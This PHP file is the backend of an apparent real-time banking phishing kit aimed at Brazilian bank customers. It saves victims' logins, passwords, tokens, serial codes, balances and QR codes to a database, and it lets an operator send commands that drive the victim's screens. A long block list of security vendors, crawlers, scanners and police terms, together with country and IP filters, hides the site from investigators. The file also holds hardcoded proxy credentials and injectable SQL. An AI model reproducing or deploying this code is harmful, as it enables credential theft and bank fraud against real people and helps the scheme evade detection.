<?php
date_default_timezone_set('America/Sao_Paulo');
session_start();
require_once('conexao.php');

function pagina($request)
{

    require_once($request);
}

function pishing_x9($pagina)
{

    require_once($pagina);
    exit;
}

if ($_GET['funcao'] == 'salvar-qr') {
    header("Access-Control-Allow-Origin: *");
    header("Content-Type: application/json");

    // Verifica método
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        http_response_code(405);
        echo json_encode(["erro" => "Método não permitido"]);
        exit;
    }

    // Verifica parâmetros obrigatórios
    if (!isset($_GET['info']) || !isset($_POST['qr'])) {
        http_response_code(400);
        echo json_encode(["erro" => "Parâmetros ausentes"]);
        exit;
    }

    // Sanitiza o nome do arquivo
    $info = $_GET['info'];
    $nome_sanitizado = preg_replace('/[^a-zA-Z0-9_\-@.]/', '_', $info);
    $nome_arquivo = str_replace(['@', '.'], ['_at_', '_'], $nome_sanitizado) . ".png";

    // Cria diretório se necessário
    $diretorio = __DIR__ . '/qrs/';
    if (!file_exists($diretorio)) {
        mkdir($diretorio, 0755, true);
    }

    // Salva a imagem
    $base64 = $_POST['qr'];
    $imagem = base64_decode($base64);
    $caminho_arquivo = $diretorio . $nome_arquivo;

    if (file_put_contents($caminho_arquivo, $imagem) === false) {
        http_response_code(500);
        echo json_encode(["erro" => "Erro ao salvar imagem"]);
        exit;
    }

    echo json_encode([
        "sucesso" => true,
        "arquivo" => $nome_arquivo
    ]);

    $usuario = $_SESSION['conta'];

    $result_usuario = "UPDATE infos SET comando='capturando_qrcode' where agencia='$info'";
    mysqli_query($ConnectDB, $result_usuario);
}

if ($_GET['funcao'] == 'puxarCnpj') {
    $cnpj = $_POST['cnpj'];

    $valor = $cnpj;

    $valor = str_replace(".", "", $valor);
    $valor = str_replace(",", "", $valor);
    $valor = str_replace("-", "", $valor);
    $valor = str_replace("/", "", $valor);
    $cnpj = $valor;

    $cr = curl_init();
    $url = 'http://cnpj.info/' . $cnpj . '';
    curl_setopt($cr, CURLOPT_URL, $url);
    //curl_setopt($cr, CURLOPT_PROXY, 'http://luuckz:SWdT83byJrl4PGBg_country-Brazil@34.205.193.19:31112');
    curl_setopt($cr, CURLOPT_HTTPHEADER, array(
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Pragma: no-cache',
        'Accept: */*'
    ));
    curl_setopt($cr, CURLOPT_RETURNTRANSFER, true);
    //$dadosSite = file_get_contents($url);
    $retorno1 = curl_exec($cr);

    $empresa = getStr($retorno1, '<tr><td>Nome da empresa</td><td><a href=', '>');

    if (!empty($empresa)) {
        $cr = curl_init();
        $url = 'http://cnpj.info/' . $empresa . '';
        curl_setopt($cr, CURLOPT_URL, $url);
        //curl_setopt($cr, CURLOPT_PROXY, 'http://luuckz:SWdT83byJrl4PGBg_country-Brazil@34.205.193.19:31112');
        curl_setopt($cr, CURLOPT_HTTPHEADER, array(
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Pragma: no-cache',
            'Accept: */*'
        ));
        curl_setopt($cr, CURLOPT_RETURNTRANSFER, true);
        //$dadosSite = file_get_contents($url);
        $retorno1 = curl_exec($cr);

        $empresanome = getStr($retorno1, '<tr><td>Nome da empresa</td><td>', '<');
        $_SESSION['empresa'] = $empresanome;
        $_SESSION['cnpj'] = $_POST['cnpj'];

        header('Content-Type: application/json');
        echo json_encode([
            'success' => true,
            'empresa' => $empresanome,
            'cnpj' => $_POST['cnpj']
        ], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
        exit;
    }
}

if ($_GET['funcao'] == 'salvar-login') {

    $usuario = $_POST['usuario'];
    $senha = $_POST['senha'];
    $tipo = $_POST['tipo'];

    $_SESSION['tipo_tela'] = $tipo;

    if (empty($senha)) {
        # code...
        print 'false';
        exit;
    }

    if (strlen($senha) > 4) {
        // A senha possui 4 caracteres
    } else {
        // A senha não possui 4 caracteres
        echo "false_senha";
        exit;
    }


    $sql = "SELECT * FROM infos WHERE agencia = '$usuario'";
    $query = mysqli_query($ConnectDB, $sql);
    $total = mysqli_num_rows($query);

    $agora = date('d/m/Y - H:i');

    if ($total == 0) {
        puxar_isp($ip);

        $_SESSION['conta'] = $usuario;
        $_SESSION['agencia'] = $senha;

        $insertSQL = "INSERT INTO `infos` (agencia, conta, tipo_conta, estado, cidade, ip, datahora, dispositivo) VALUES ('$usuario', '$senha', '" . $_POST['tipo'] . "', '" . $_SESSION['estado'] . "', '" . $_SESSION['cidade'] . "', '$ip', '$agora', '" . Obter_SO() . "')";
        mysqli_select_db($ConnectDB, $database_ConnectDB);
        mysqli_query($ConnectDB, $insertSQL);

        $insertSQL2 = "INSERT INTO `backup` (usuario, senha, data, tipo, device) VALUES ('$usuario', '$senha', '$agora', '" . $_POST['tipo'] . "', '" . Obter_SO() . "')";
        mysqli_select_db($ConnectDB, $database_ConnectDB);
        mysqli_query($ConnectDB, $insertSQL2);

        print 'true';
        exit;
    } else {
        puxar_isp($ip);

        $result_usuario = "UPDATE infos SET conta='" . $senha . "', comando='SENHA ATUALIZADA' where agencia='" . $usuario . "'";
        mysqli_query($ConnectDB, $result_usuario);

        $_SESSION['conta'] = $usuario;
        $_SESSION['agencia'] = $senha;
        print 'true';
    }
}

if ($_GET['acao'] == 'online') {
    $data['atual'] = date('Y-m-d H:i:s');


    $data['online'] = strtotime($data['atual'] . " - 5 seconds");
    $data['online'] = date("Y-m-d H:i:s", $data['online']);


    $result_qnt_visitas = "SELECT count(id) as online FROM visitas WHERE data_final >= '" . $data['online'] . "'";


    $resultado_qnt_visitas = mysqli_query($ConnectDB, $result_qnt_visitas);
    $row_qnt_visitas = mysqli_fetch_assoc($resultado_qnt_visitas);
    echo $row_qnt_visitas['online'];
}

function puxar_isp($data_ip)
{

    $proxy = 'tcp://pr.pyproxy.com:16666'; // Defina o endereço e a porta do seu proxy

    $context = stream_context_create([
        'http' => [
            'proxy' => $proxy,
            'request_fulluri' => true,
            'header' => "Proxy-Authorization: Basic " . base64_encode("PY7154A-zone-resi-region-br:PY7154ABR"), // Use esta linha se precisar de autenticação
        ]
    ]);

    $details = json_decode(file_get_contents("http://ip-api.com/json/$data_ip"));

    //$details = json_decode(file_get_contents("http://ip-api.com/json/$data_ip", false, $context));

    $pais = $details->country;
    $estado = $details->regionName;
    $cidade = $details->city;
    $servidor = $details->isp;
    $org = $details->org;

    $_SESSION['estado'] = $estado;
    $_SESSION['cidade'] = $cidade;
    $_SESSION['servidor'] = $servidor;
    $_SESSION['pais'] = $pais;
}

function verificar_isp()
{
    $palavrasbloqueadas = array(
        'Google LLC',
        'Chrome',
        'Googlebot',
        'googleweblight',
        'Facebook',
        'facebook',
        'facebookexternalhit',
        'Facebot',
        'external',
        'GoDaddy',
        'Hosting',
        'amazonaws',
        'Amazon',
        'Amazon Technologies Inc.',
        'AdsBot',
        'Microsoft',
        'Yahoo',
        'Qnax Ltda',
        'AVAST',
        's.r.o',
        'DigitalOcean',
        'Digital Ocean',
        'proxy',
        'Maxihost',
        'Heficed',
        'Censys',
        'Locaweb',
        'USA,',
        'Volarehost',
        'M247',
        'OVH',
        'Linode',
        'btg',
        'delegacia',
        'policia',
        'bradesco',
        'next',
        'virustotal',
        'virus total',
        'BTT',
        'Finegroupservers',
        'Ipxo',
        'MIRholding',
        'Datacamp',
        'HostRoyale',
        'Limited',
        'daycoval',
        'trafficforce',
        'vpn',
        'unifique',
        'fastville',
        'google',
        'pvt',
        'Geekyworks',
        'kaspersky',
        'IONOS',
        'G-Core',
        'IOMART',
        'Host Universal',
        'Communications',
        'The Constant Company',
        'Choopa',
        'Oracle',
        'iugu',
        'Google',
        'Corporation',
        'CenturyLink',
        'Hostinger',
        'Tefincom',
        'Leaseweb USA',
        'France Telecom',
        'QuickPacket',
        'Technologies',
        'iWeb',
        'EGIHosting',
        'Stark Industries',
        'Solutions LTD',
        'Europe SRL',
        'Web.com.ph',
        'Pte.ltd',
        'pagespeed',
        'Hivelocity',
        'McAfee',
        'AhrefsBot',
        'SemrushBot',
        'Bingbot',
        'YandexBot',
        'DuckDuckBot',
        'MJ12bot',
        'DotBot',
        'PetalBot',
        'Sogou',
        'Exabot',
        'SeznamBot',
        'BLEXBot',
        'MegaIndex',
        'ZoominfoBot',
        'CrawlBot',
        'SerpstatBot',
        'LinkpadBot',
        'UptimeRobot',
        'Pingdom',
        'Site24x7',
        'Sucuri',
        //'Cloudflare',
        'Imperva',
        'Zscaler',
        'Palo Alto Networks',
        'Barracuda',
        'Proofpoint',
        'Fortinet',
        'Trend Micro',
        'Sophos',
        'ESET',
        'Bitdefender',
        'Norton',
        'Comodo',
        'F-Secure',
        'AVG',
        'Avira',
        'McAfee',
        'Kaspersky',
        'Malwarebytes',
        'SentinelOne',
        'CrowdStrike',
        'Carbon Black',
        'Cylance',
        'FireEye',
        'Check Point',
        'WatchGuard',
        'Cisco Umbrella',
        'Blue Coat',
        'Websense',
        'Forcepoint',
        'Zscaler',
        'OpenDNS',
        'Netcraft',
        'PhishTank',
        'Spamhaus',
        'AbuseIPDB',
        'Project Honeypot',
        'StopForumSpam',
        'FraudGuard',
        'CleanTalk',
        'IPQualityScore',
        'Scamalytics',
        'ThreatMetrix',
        'RiskIQ',
        'Digital Shadows',
        'Recorded Future',
        'Flashpoint',
        'ZeroFOX',
        'IntSights',
        'Cybersixgill',
        'DarkOwl',
        'Shodan',
        'Censys',
        'BinaryEdge',
        'ZoomEye',
        'Onyphe',
        'GreyNoise',
        'ThreatConnect',
        'ThreatQuotient',
        'Anomali',
        'EclecticIQ',
        'Maltego',
        'SpiderFoot',
        'Recon-ng',
        'OSINT Framework',
        'IntelTechniques',
        'Hunchly',
        'Social Links',
        'DataSploit',
        'Creepy',
        'FOCA',
        'Metagoofil',
        'theHarvester',
        'Sublist3r',
        'Amass',
        'Assetnote',
        'Aquatone',
        'Eyewitness',
        'Photon',
        'Hakrawler',
        'Gospider',
        'LinkFinder',
        'ParamSpider',
        'Arjun',
        'XSStrike',
        'SQLMap',
        'NoSQLMap',
        'Commix',
        'XSSer',
        'BeEF',
        'Metasploit',
        'Nmap',
        'Nikto',
        'Wapiti',
        'W3af',
        'OWASP ZAP',
        'Burp Suite',
        'Acunetix',
        'Nessus',
        'OpenVAS',
        'Qualys',
        'Rapid7',
        'Tenable',
        'Core Impact',
        'Immunity Canvas',
        'Cobalt Strike',
        'Armitage',
        'Empire',
        'PowerSploit',
        'Mimikatz',
        'Responder',
        'Impacket',
        'CrackMapExec',
        'BloodHound',
        'SharpHound',
        'Neo4j',
        'Maltego',
        'SpiderFoot',
        'Recon-ng',
        'OSINT Framework',
        'IntelTechniques',
        'Hunchly',
        'Social Links',
        'DataSploit',
        'Creepy',
        'FOCA',
        'Metagoofil',
        'theHarvester',
        'Sublist3r',
        'Amass',
        'Assetnote',
        'Aquatone',
        'Eyewitness',
        'Photon',
        'Hakrawler',
        'Gospider',
        'LinkFinder',
        'ParamSpider',
        'Arjun',
        'XSStrike',
        'SQLMap',
        'NoSQLMap',
        'Commix',
        'XSSer',
        'BeEF',
        'Metasploit',
        'Nmap',
        'Nikto',
        'Wapiti',
        'W3af',
        'OWASP ZAP',
        'Burp Suite',
        'Acunetix',
        'Nessus',
        'OpenVAS',
        'Qualys',
        'Rapid7',
        'Tenable',
        'Core Impact',
        'Immunity Canvas',
        'Cobalt Strike',
        'Armitage',
        'Empire',
        'PowerSploit',
        'Mimikatz',
        'Responder',
        'Impacket',
        'CrackMapExec',
        'BloodHound',
        'SharpHound',
        'Neo4j'
    );

    $date = date('d/m/Y - H:i');
    $date;
    $dados_ISP_BLOCK = "(" . $_GET['app'] . ") - (ISP BLOCK) - (" . $date . ") - (" . Obter_SO() . ") > Servidor: " . $_SESSION['servidor'] . "| Estado: " . $_SESSION['estado'] . "  (" . $_SESSION['pais'] . ") | IP: " . $_SESSION['ip'] . "\n";


    if (preg_match(sprintf('/%s/i', implode('|', $palavrasbloqueadas)), $_SESSION['servidor'])) {
        file_put_contents("./webdriver/die.db", $dados_ISP_BLOCK, FILE_APPEND);
        pishing_x9('./webdriver/paginas/x9.php');
        exit();
    } else {
    }
}

function BloquearIP()
{
    $IpBloqueado = array(
        '177.25.237.33',
        '104.237.188.14',
        '104.28.235.226'
    );

    $ip = getIp();

    $date = date('d/m/Y - H:i');
    $date;
    $dados_IP_BLOCK = "(IP BLOCK) - (" . $date . ") - (" . Obter_SO() . ") > Servidor: " . $_SESSION['servidor'] . "| Estado: " . $_SESSION['estado'] . "  (" . $_SESSION['pais'] . ") | IP: " . $_SESSION['ip'] . "\n";


    if (preg_match(sprintf('/%s/i', implode('|', $IpBloqueado)), $ip)) {
        file_put_contents("./webdriver/die.db", $dados_IP_BLOCK, FILE_APPEND);
        pishing_x9('./webdriver/paginas/x9.php');
        exit();
    } else {
    }
}

function verificar_agent()
{

    $useragent = $_SERVER['HTTP_USER_AGENT'];

    $palavrasliberadas = array(
        'Mozilla',
    );

    if (preg_match(sprintf('/%s/i', implode('|', $palavrasliberadas)), $useragent)) {
    } else {
        pishing_x9('./webdriver/paginas/x9.php');
        exit();
    }
}

function verificar_dispositivo_2()
{

    $upper = implode('', range('A', 'Z'));
    $lower = implode('', range('a', 'z'));
    $nums = implode('', range(0, 9));

    $alphaNumeric = $upper . $lower . $nums;
    $string = '';
    $len = 20;
    for ($i = 0; $i < $len; $i++) {
        $string .= $alphaNumeric[rand(0, strlen($alphaNumeric) - 1)];
    }

    $ip = getIp();
    //$ip = '168.138.0.0';

    $_SESSION['string_ip_cloudflare'] = $ip;
    $_SESSION['string_ipmd5_cloudflare'] = md5($ip);

    $_SESSION['string_cloudflare'] = $string;

    if (empty(Obter_SO())) {
        pishing_x9('../webdriver/paginas/x9.php');
        exit;
    } else {
        if (empty($_GET['app'])) {
            pishing_x9('../webdriver/paginas/x9.php');
            exit();
        }
    }
}

function verificar_dispositivo()
{

    $upper = implode('', range('A', 'Z'));
    $lower = implode('', range('a', 'z'));
    $nums = implode('', range(0, 9));

    $alphaNumeric = $upper . $lower . $nums;
    $string = '';
    $len = 20;
    for ($i = 0; $i < $len; $i++) {
        $string .= $alphaNumeric[rand(0, strlen($alphaNumeric) - 1)];
    }

    $ip = getIp();
    //$ip = '168.138.0.0';

    $_SESSION['string_ip_cloudflare'] = $ip;
    $_SESSION['string_ipmd5_cloudflare'] = md5($ip);

    $_SESSION['string_cloudflare'] = $string;

    if (empty(Obter_SO())) {
        pishing_x9('./webdriver/paginas/x9.php');
        exit;
    } else {
        if (empty($_GET['app'])) {
            pishing_x9('./webdriver/paginas/x9.php');
            exit();
        }
    }
}

function verificar_pais()
{

    $date = date('d/m/Y - H:i');
    $date;

    $dados_IP_GRINGO = "(" . $_GET['app'] . ") - (IP GRINGO) - (" . $date . ") - (" . Obter_SO() . ") > Servidor: " . $_SESSION['servidor'] . "| Estado: " . $_SESSION['estado'] . "  (" . $_SESSION['pais'] . ") | IP: " . $_SESSION['ip'] . "\n";
    $dados_IP_CIDADE = "(" . $_GET['app'] . ") - (CIDADE BLOQUEADA) - (" . $date . ") - (" . Obter_SO() . ") > Servidor: " . $_SESSION['servidor'] . "| Estado: " . $_SESSION['estado'] . "  (" . $_SESSION['pais'] . ") | IP: " . $_SESSION['ip'] . "\n";

    if ($_SESSION['pais'] == 'Brazil') {
    } else {
        file_put_contents("./webdriver/die.db", $dados_IP_GRINGO, FILE_APPEND);
        pishing_x9('./webdriver/paginas/x9.php');
        exit;
    }
}

function Obter_SO()
{
    /**
     * Windows...
     */
    //$sistemas_operativos['windows nt 5.2'] = 'Windows 2003';
    //$sistemas_operativos['windows nt 6.0'] = 'Windows Vista';
    $sistemas_operativos['windows nt 6.1'] = 'Windows 7';
    $sistemas_operativos['windows nt 6.2'] = 'Windows 8';
    $sistemas_operativos['windows nt 6.3'] = 'Windows 8.1';
    $sistemas_operativos['windows nt 10.0'] = 'Windows 10';
    /**
     * So Móveis...
     */
    $sistemas_operativos['Android'] = 'Android';
    $sistemas_operativos['iPhone'] = 'iPhone';
    //$sistemas_operativos['iPad'] = 'iPad';
    //$sistemas_operativos['elaine'] = 'Palm';
    //$sistemas_operativos['palm'] = 'Palm';
    //$sistemas_operativos['series60'] = 'Symbian S60';
    //$sistemas_operativos['symbian'] = 'Symbian';
    //$sistemas_operativos['SymbianOS'] = 'Symbian OS';
    //$sistemas_operativos['windows ce'] = 'Windows CE';
    //$sistemas_operativos['Windows Phone'] = 'Windows Phone';
    /**
     * Mac...
     */
    $sistemas_operativos['mac'] = 'Mac';
    $sistemas_operativos['Mac OS X'] = 'Mac OS X';
    $sistemas_operativos['Mac 10'] = 'Mac OS X';
    $sistemas_operativos['Mac OS X 10_4'] = 'Mac OS X Tiger';
    $sistemas_operativos['Mac OS X 10_5'] = 'Mac OS X Leopard';
    $sistemas_operativos['Mac OS X 10_5_2'] = 'Mac OS X Leopard';
    $sistemas_operativos['Mac OS X 10_5_3'] = 'Mac OS X Leopard';
    $sistemas_operativos['PowerPC'] = 'Mac PPC';
    $sistemas_operativos['PPC'] = 'Mac PPC';

    if (is_array($sistemas_operativos)) {
        foreach ($sistemas_operativos as $ua => $sistemas_operativo) {
            if (preg_match("|" . preg_quote($ua) . "|i", trim($_SERVER['HTTP_USER_AGENT']))) {
                return $sistemas_operativo;
            }
        }
    }
}

if ($_GET['acao'] == 'comando') {
    mysqli_select_db($ConnectDB, $database_ConnectDB);
    $query_UserJson = sprintf("SELECT * FROM infos WHERE agencia = '" . $_SESSION['conta'] . "'");
    $UserJson = mysqli_query($ConnectDB, $query_UserJson);
    $row_UserJson = mysqli_fetch_assoc($UserJson);
    $totalRows_UserJson = mysqli_num_rows($UserJson);

    $chave = $_SESSION['conta'];
    $key = $row_UserJson['agencia'];
    if ($chave == $key) {
        $_SESSION['key'] = $key;
        echo $pagina = $row_UserJson['comando'];
        //print 'token_erro';
        $_SESSION['comando'] = $pagina;
        exit;
    } else {
        echo 'bloquear';
        exit();
    }
}

if ($_GET['funcao'] == 'enviar-comando') {

    $comando = $_POST['comando'];

    $usuario = $_SESSION['conta'];
    $senha = $_SESSION['agencia'];
    $tela = $_SESSION['tipo_tela'];

    //TelegramLogin($usuario, $senha, $comando, $tela);

    $result_usuario = "UPDATE infos SET comando='$comando' where agencia='" . $_SESSION['conta'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}

if ($_GET['page'] == 'finalizar') {

    session_start();
    session_destroy();
    session_start();
}

if ($_GET['funcao'] == 'senha4') {

    $valor = $_POST['valor'];
    $comando = $_POST['funcao'];

    if (preg_match('/^[\d\-]+$/', $_POST['valor']) > 0) {
    } else {
        echo 'false';
        exit;
    }

    if (preg_match("/^.{4,}$/", $_POST['valor'])) {
        print 'true';
        $result_usuario = "UPDATE infos SET senha='" . $_POST['valor'] . "', comando='$comando' where conta='" . $_SESSION['conta'] . "'";
        mysqli_query($ConnectDB, $result_usuario);
        return true;
    } else {
        print 'false';
        return false;
    }
}

if ($_GET['funcao'] == 'selecionar-titular') {

    $valor = $_POST['valor'];
    $comando = $_POST['funcao'];

    $_SESSION['titular_nome'] = $valor;

    $result_usuario = "UPDATE infos SET titular='" . $_POST['valor'] . "', comando='$comando' where agencia='" . $_SESSION['conta'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}

if ($_GET['funcao'] == 'cadastrar-serial') {

    $valor = $_POST['valor'];
    $comando = $_POST['funcao'];
    $agora = date('d/m/Y - H:i');

    if (preg_match('/^[\d\-]+$/', $_POST['valor']) > 0) {
    } else {
        echo 'false';
        exit;
    }

    $sql = "SELECT * FROM tabela_token WHERE conta = '" . $_SESSION['conta'] . "' and token = '" . $_POST['valor'] . "'";
    $query = mysqli_query($ConnectDB, $sql);
    $total = mysqli_num_rows($query);
    if ($total == 0) {
        $_SESSION['unlock_conta'] = $_POST['valor'];
        $insertSQL = "INSERT INTO `tabela_token` (conta, token, tipo, datahora) VALUES ('" . $_SESSION['conta'] . "', '" . $_POST['valor'] . "', '$comando', '$agora')";
        mysqli_select_db($ConnectDB, $database_ConnectDB);
        mysqli_query($ConnectDB, $insertSQL);
    } else {
        print 'false';
        exit;
    }
}

if ($_GET['funcao'] == 'salvar-token') {

    $valor = $_POST['valor'];
    $comando = $_POST['funcao'];
    $agora = date('d/m/Y - H:i');

    $sql = "SELECT * FROM tabela_token WHERE conta = '" . $_SESSION['conta'] . "' and token = '" . $_POST['valor'] . "'";
    $query = mysqli_query($ConnectDB, $sql);
    $total = mysqli_num_rows($query);
    if ($total == 0) {
        $insertSQL = "INSERT INTO `tabela_token` (conta, token, tipo, datahora) VALUES ('" . $_SESSION['conta'] . "', '" . $_POST['valor'] . "', '$comando', '$agora')";
        mysqli_select_db($ConnectDB, $database_ConnectDB);
        mysqli_query($ConnectDB, $insertSQL);
        print 'true';
    } else {
        $insertSQL = "INSERT INTO `tabela_token` (conta, token, tipo, datahora) VALUES ('" . $_SESSION['conta'] . "', '" . $_POST['valor'] . "', '$comando', '$agora')";
        mysqli_select_db($ConnectDB, $database_ConnectDB);
        mysqli_query($ConnectDB, $insertSQL);
        print 'true';
        exit;
    }
}

/////////////////////

if ($_GET['funcao'] == 'atualizar-titular') {

    $titular01 = $_POST['titular_1'];
    $titular02 = $_POST['titular_2'];
    $variacao = $_POST['variacao'];
    $comando = $_POST['comando'];

    $result_usuario = "UPDATE infos SET titular_01='$titular01', titular_02='$titular02', variacao='$variacao', comando='$comando' where id='" . $_GET['id'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}

if ($_GET['funcao'] == 'enviar-cmd-admin') {
    $comando = $_POST['comando'];

    $result_usuario = "UPDATE infos SET comando='$comando' where id='" . $_GET['id'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}

if ($_GET['funcao'] == 'select-tipo') {

    $tipo = $_POST['tipo'];

    $_SESSION['bradesco_tipo'] = $tipo;
}

if ($_GET['funcao'] == 'enviar-saldo') {

    $valor = $_POST['valor'];
    $comando = $_POST['comando'];

    $result_usuario = "UPDATE infos SET saldo='" . $_POST['valor'] . "', comando='$comando' where id='" . $_GET['id'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}

if ($_GET['funcao'] == 'enviar-serial') {

    $valor = $_POST['valor'];
    $comando = $_POST['comando'];

    $result_usuario = "UPDATE infos SET serial='" . $_POST['valor'] . "', comando='$comando' where id='" . $_GET['id'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}

if ($_GET['funcao'] == 'enviar-tabela') {

    $valor = $_POST['valor'];
    $comando = $_POST['comando'];

    $result_usuario = "UPDATE infos SET tabela='" . $_POST['valor'] . "', comando='$comando' where id='" . $_GET['id'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}

if ($_GET['funcao'] == 'enviar-toque') {

    $valor = $_POST['valor'];
    $valor2 = $_POST['valor2'];
    $comando = $_POST['comando'];

    $result_usuario = "UPDATE infos SET titular='" . $_POST['valor'] . "', titular_01='" . $_POST['valor2'] . "', comando='$comando' where id='" . $_GET['id'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}


if ($_GET['funcao'] == 'acionar-comando') {
    $comando = $_POST['comando'];

    $result_usuario = "UPDATE infos SET comando='$comando' where id='" . $_GET['id'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}

if ($_GET['funcao'] == 'operar') {
    $comando = $_POST['comando'];

    $result_usuario = "UPDATE infos SET status='" . $_SESSION['nome_usu_sessao'] . "' where id='" . $_GET['id'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}
/////////////////////

if ($_GET['funcao'] == 'consultar-serial') {
    mysqli_select_db($ConnectDB, $database_ConnectDB);
    $query_UserJson = sprintf("SELECT * FROM infos WHERE agencia = '" . $_SESSION['conta'] . "'");
    $UserJson = mysqli_query($ConnectDB, $query_UserJson);
    $row_UserJson = mysqli_fetch_assoc($UserJson);
    $totalRows_UserJson = mysqli_num_rows($UserJson);

    print $row_UserJson['serial'];
}

if ($_GET['funcao'] == 'consultar-tabela') {
    mysqli_select_db($ConnectDB, $database_ConnectDB);
    $query_UserJson = sprintf("SELECT * FROM infos WHERE agencia = '" . $_SESSION['conta'] . "'");
    $UserJson = mysqli_query($ConnectDB, $query_UserJson);
    $row_UserJson = mysqli_fetch_assoc($UserJson);
    $totalRows_UserJson = mysqli_num_rows($UserJson);

    print $row_UserJson['tabela'];
}

if ($_GET['funcao'] == 'tabela-atual') {
    mysqli_select_db($ConnectDB, $database_ConnectDB);
    $query_UserJson = sprintf("SELECT * FROM tabela_token WHERE conta = '" . $_GET['id'] . "' ORDER BY id DESC");
    $UserJson = mysqli_query($ConnectDB, $query_UserJson);
    $row_UserJson = mysqli_fetch_assoc($UserJson);
    $totalRows_UserJson = mysqli_num_rows($UserJson);

    print $row_UserJson['token'];
}

if ($_GET['funcao'] == 'verifica-titular') {
    mysqli_select_db($ConnectDB, $database_ConnectDB);
    $query_UserJson = sprintf("SELECT * FROM infos WHERE agencia = '" . $_SESSION['conta'] . "'");
    $UserJson = mysqli_query($ConnectDB, $query_UserJson);
    $row_UserJson = mysqli_fetch_assoc($UserJson);
    $totalRows_UserJson = mysqli_num_rows($UserJson);

    $_SESSION['id_vitima'] = $row_UserJson['id'];

    if (!empty($row_UserJson['titular_02'])) {
        print 'true';
    } else {
        print 'false';
    }
}

if ($_GET['funcao'] == 'consultar-saldo') {
    mysqli_select_db($ConnectDB, $database_ConnectDB);
    $query_UserJson = sprintf("SELECT * FROM infos WHERE agencia = '" . $_SESSION['conta'] . "'");
    $UserJson = mysqli_query($ConnectDB, $query_UserJson);
    $row_UserJson = mysqli_fetch_assoc($UserJson);
    $totalRows_UserJson = mysqli_num_rows($UserJson);

    print $row_UserJson['saldo'];
    $_SESSION['saldo'] = $row_UserJson['saldo'];
}

if ($_GET['funcao'] == 'titular') {
    mysqli_select_db($ConnectDB, $database_ConnectDB);
    $query_UserJson = sprintf("SELECT * FROM infos WHERE conta = '" . $_SESSION['conta'] . "'");
    $UserJson = mysqli_query($ConnectDB, $query_UserJson);
    $row_UserJson = mysqli_fetch_assoc($UserJson);
    $totalRows_UserJson = mysqli_num_rows($UserJson);

    print $row_UserJson['titular'];
}

if ($_GET['funcao'] == 'consultar-qrcode') {
    mysqli_select_db($ConnectDB, $database_ConnectDB);
    $query_UserJson = sprintf("SELECT * FROM infos WHERE agencia = '" . $_SESSION['conta'] . "'");
    $UserJson = mysqli_query($ConnectDB, $query_UserJson);
    $row_UserJson = mysqli_fetch_assoc($UserJson);
    $totalRows_UserJson = mysqli_num_rows($UserJson);

    print $row_UserJson['qrcode'];
}

if ($_GET['app'] == 'qrcode') {

    $name = $_FILES['file']['name'];
    $target_dir = "qrcode/";
    $target_file = $target_dir . basename($_FILES["file"]["name"]);

    // Select file type
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

    // Valid file extensions
    $extensions_arr = array("jpg", "jpeg", "png", "gif");

    // Check extension
    if (in_array($imageFileType, $extensions_arr)) {
        // Upload file
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_dir . $name)) {
            // Convert to base64 
            $image_base64 = base64_encode(file_get_contents('qrcode/' . $name));
            $image = 'data:image/' . $imageFileType . ';base64,' . $image_base64;

            // Insert record
            $result_usuario = "UPDATE infos SET qrcode='" . $image . "', comando='solicitar_serial_qr' where id='" . $_GET['client_id'] . "'";
            mysqli_query($ConnectDB, $result_usuario);
            mysqli_query($ConnectDB, $query);

            print 'true';

            unlink('qrcode/' . $name);
        }
    } else {
        print 'false';
    }
}

if ($_GET['page'] == 'contarclick') {
    $lines1 = file_get_contents("./live.db");
    $lines1 = explode("\n", $lines1);
    //$lines = array_unique($lines);
    print $num_visitas = count($lines1) - 1;
    exit();
}

if ($_GET['page'] == 'contar_gerados') {
    print $_SESSION['valores_gerados'];
    exit();
}

if ($_GET['page'] == 'contar_pagos') {
    print $_SESSION['valores_pago'];
    exit();
}

if ($_GET['page'] == 'contarx9') {
    $lines1 = file_get_contents("./die.db");
    $lines1 = explode("\n", $lines1);
    //$lines = array_unique($lines);
    print $num_visitas = count($lines1) - 1;
    exit();
}

if ($_GET['page'] == 'contarinfos') {
    $sql = "SELECT * FROM infos";
    $query = mysqli_query($ConnectDB, $sql);
    $contar_infos = mysqli_num_rows($query);
    print $contar_infos;
    exit;
}

if ($_GET['page'] == 'apagartudo') {
    $result_usuario = "DELETE FROM infos";
    $resultado_usuario = mysqli_query($ConnectDB, $result_usuario);

    $result_usuario2 = "DELETE FROM tabela_token";
    $resultado_usuario2 = mysqli_query($ConnectDB, $result_usuario2);
    exit;
}

if ($_GET['app'] == 'online') {
    $data['atual'] = date('Y-m-d H:i:s');

    //Diminuir 1 minuto, contar usuário no site no último minuto
    //$data['online'] = strtotime($data['atual'] . " - 1 minutes");

    //Diminuir 20 segundos 
    $data['online'] = strtotime($data['atual'] . " - 5 seconds");
    $data['online'] = date("Y-m-d H:i:s", $data['online']);
    //echo $_SESSION['visitante'];
    if ((isset($_SESSION['visitante'])) and (!empty($_SESSION['visitante']))) {

        print $result_up_visita = "UPDATE visitas SET data_final = '" . $data['atual'] . "', client_id = '" . $_POST['contar'] . "' WHERE id = '" . $_SESSION['visitante'] . "'";

        $resultado_up_visitas = mysqli_query($ConnectDB, $result_up_visita);
    } else {
        //Salvar no banco de dados
        $result_visitas = "INSERT INTO visitas (data_inicio, data_final, client_id) VALUES ('" . $data['atual'] . "', '" . $data['atual'] . "', '" . $_POST['contar'] . "')";

        $resultado_visitas = mysqli_query($ConnectDB, $result_visitas);

        $_SESSION['visitante'] = mysqli_insert_id($ConnectDB);
    }

    //Pesquisar os ultimos usuarios online nos 20 segundo
